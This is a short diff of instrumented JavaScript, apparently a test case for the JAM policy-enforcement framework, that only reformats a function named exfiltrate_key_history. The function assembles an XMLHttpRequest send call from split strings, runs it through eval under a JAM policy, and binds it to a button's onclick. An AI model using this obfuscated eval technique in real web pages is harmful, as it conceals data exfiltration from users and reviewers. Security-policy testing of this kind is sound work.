@@ -7,11 +7,11 @@ function exfiltrate_key_history() {
   var e$$4 = "xmlhttp.se";
   var f = "nd(null);";
   var v0 = a + b + c + d + e$$4 + f;
-  if(JAM.isEval(eval)) {
-    eval("introspect(JAM.policy.pFull) { " + v0 + " }")
-  }else {
-    JAM.call(eval, null, [v0])
+  if (JAM.isEval(eval)) {
+    eval("introspect(JAM.policy.pFull) { " + v0 + " }");
+  } else {
+    JAM.call(eval, null, [v0]);
   }
-  return
+  return;
 }
 JAM.set(JAM.call(JAM.get(document, "getElementById", JAM.policy.p5), document, ["test"], JAM.policy.p5), "onclick", exfiltrate_key_history, JAM.policy.p3)
